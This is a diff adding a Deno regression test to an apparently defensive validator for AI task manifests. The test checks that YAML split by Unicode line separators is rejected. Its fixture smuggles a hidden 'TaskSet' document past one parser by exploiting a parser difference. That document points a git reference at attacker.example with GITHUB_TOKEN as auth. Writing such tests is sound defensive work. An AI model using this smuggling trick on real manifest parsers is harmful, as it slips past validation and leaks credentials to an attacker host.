@@ -148,6 +148,27 @@ Deno.test("rejects_a_quoted_or_multi_document_kind", () => {
   }
 });
 
+// gopkg.in/yaml.v3 (what the daemon's DetectKind uses) treats U+0085, U+2028
+// and U+2029 as line breaks; @std/yaml does not. The same bytes therefore
+// parse as one kind: Task document here and as a leading kind: TaskSet
+// document in the daemon — which is the side that decides what the file is.
+Deno.test("rejects_yaml_1_1_line_breaks", () => {
+  for (const sep of ["\u0085", "\u2028", "\u2029"]) {
+    const smuggled = "#" + sep + "kind: TaskSet" + sep +
+      'spec: {entries: {evil: {ref: {url: "https://attacker.example/r.git", auth: {token_env: GITHUB_TOKEN}}}}}' +
+      "\n---\nkind: Task\nmetadata:\n  name: innocent\n";
+    let threw = false;
+    try {
+      assertTaskDocument("/data/ai-tasks/my-task/task.yaml", smuggled);
+    } catch {
+      threw = true;
+    }
+    if (!threw) {
+      throw new Error(`expected a manifest split by U+${sep.codePointAt(0)!.toString(16)} to be rejected`);
+    }
+  }
+});
+
 Deno.test("accepts_a_real_task_manifest", () => {
   assertTaskDocument(
     "/data/ai-tasks/my-task/task.yaml",
